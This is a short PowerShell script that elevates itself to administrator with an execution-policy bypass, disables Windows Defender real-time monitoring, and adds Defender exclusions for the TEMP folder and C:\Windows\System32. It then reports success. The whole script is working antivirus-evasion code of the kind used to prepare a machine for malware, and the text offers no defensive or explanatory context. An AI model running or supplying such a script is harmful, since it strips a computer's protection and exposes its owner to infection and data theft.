# Ensure the script runs with elevated privileges (UAC check)
$Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -NoProfile -File '$PSCommandPath'" -Verb RunAs
    exit
}

# Step 1: Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Step 2: Add exclusions for paths in Windows Defender
Set-MpPreference -ExclusionPath "$env:TEMP", "C:\Windows\System32"

# Step 3: Notify successful completion using Console-based dialog
Clear-Host
Write-Host "Actions completed successfully."
[System.Console]::WriteLine("")
[System.Console]::WriteLine("Press Enter to exit...")
[System.Console]::ReadLine()
pause
